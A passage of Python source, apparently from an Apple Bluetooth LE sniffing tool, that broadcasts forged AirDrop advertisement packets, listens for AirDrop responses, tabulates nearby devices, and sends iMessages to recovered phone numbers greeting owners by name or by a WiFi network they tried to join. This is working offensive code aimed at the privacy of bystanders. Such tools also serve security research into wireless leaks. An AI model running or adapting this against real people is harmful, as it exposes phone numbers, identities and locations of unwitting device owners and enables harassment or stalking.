                                                                                   get_dict_val(dictOfss, SSID_hash))
        elif phone_number_info[phone]['name']:
            text = 'Hi {}! Gotcha!'.format(phone_number_info[phone]['name'])
        elif get_dict_val(dictOfss, SSID_hash):
            text = 'Looks like you have tried to connect to WiFi:{}'.format(get_dict_val(dictOfss, SSID_hash))
        else:
            text = 'Gotcha!'
        if args.check_hlr:
            if phone_number_info[phone]['status'] == 'Live':
                send_imessage(phone, text)
        else:
            send_imessage(phone, text)
        time.sleep(2)


def start_listetninig():
    AirDropCli(["find"])


def adv_airdrop():
    while True:
        dev_id = 0
        toggle_device(dev_id, True)
        header = (0x02, 0x01, 0x1a, 0x1b, 0xff, 0x4c, 0x00)
        data1 = (0x05, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01)
        apple_id = (0x00, 0x00)
        phone = (0x00, 0x00)
        email = (0xb7, 0x9b)
        data2 = (0x00, 0x00, 0x00, 0x10, 0x02, 0x0b, 0x00)
        try:
            sock = bluez.hci_open_dev(dev_id)
        except:
            print("Cannot open bluetooth device %i" % dev_id)
            raise
        start_le_advertising(sock, adv_type=0x02, min_interval=500, max_interval=500,
                             data=(header + data1 + apple_id + phone + email + data2))
        time.sleep(10)
        stop_le_advertising(sock)


def print_results3(data):
    if not len(data):
        return ''
    u_data = []
    for dev in data:
        if dev not in u_data:
            u_data.append(dev)
    x = PrettyTable()
    x.field_names = ["Name", "Host", "OS", "Discoverable", 'Address']
    for dev in u_data:
        x.add_row([dev['name'], dev['host'], dev['os'], dev['discoverable'], dev['address']])
    return x.get_string()


if args.ssid:
    thread_ssid = Thread(target=get_ssids, args=())
    thread_ssid.daemon = True
    thread_ssid.start()

if args.airdrop:
    thread2 = Thread(target=start_listetninig, args=())
    thread2.daemon = True
    thread2.start()

    thread3 = Thread(target=adv_airdrop, args=())
    thread3.daemon = True
    thread3.start()

if args.verb:
    logFile = '/tmp/apple_bleee_{}'.format(random.randint(1, 3000))

init_bluez()
thread1 = Thread(target=do_sniff, args=(False,))
thread1.daemon = True
thread1.start()
MyApp = App()
MyApp.run()
thread1.join()
